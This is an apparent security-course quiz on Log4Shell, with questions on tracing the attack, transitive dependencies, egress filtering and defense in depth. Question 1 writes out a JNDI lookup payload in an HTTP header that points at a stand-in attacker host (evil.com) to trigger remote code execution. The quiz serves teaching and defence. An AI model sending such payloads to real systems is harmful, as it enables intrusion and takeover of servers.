# Lesson 8 Quiz: Log4Shell — Dependency Attacks

Answer these questions without looking back at the lesson. Focus on demonstrating that you understand the mechanisms, not just the facts.

---

### Question 1: Trace the Attack

An attacker sends this HTTP request to a Java web application running an unpatched version of Log4j:

```
GET /search?q=shoes HTTP/1.1
Host: shop.example.com
X-Forwarded-For: ${jndi:ldap://evil.com/pwn}
```

The application has this line of code:

```java
logger.info("Search from IP: " + request.getHeader("X-Forwarded-For"));
```

Trace the complete attack flow from the moment this request arrives at the server to the moment the attacker achieves remote code execution. Be specific about each step.

---

### Question 2: Transitive Dependencies

Explain what a transitive dependency is and why transitive dependencies made Log4Shell so difficult to respond to. Include a concrete example of a dependency chain where a developer might be using Log4j without knowing it.

---

### Question 3: Egress Filtering

A colleague says: "We can't patch Log4j right now because we need to regression-test our entire application first. But we'll get to it next sprint."

Explain how **egress filtering** could mitigate Log4Shell as an interim measure, even without patching. What specific network behavior would it block, and why would that neutralize the attack?

---

### Question 4: Defense in Depth in Practice

You are building a new web application. Based on what you have learned in this lesson (and lesson 7), describe at least four concrete defensive practices you would implement to protect against unknown future vulnerabilities in your dependencies. For each practice, explain what specific threat it addresses.
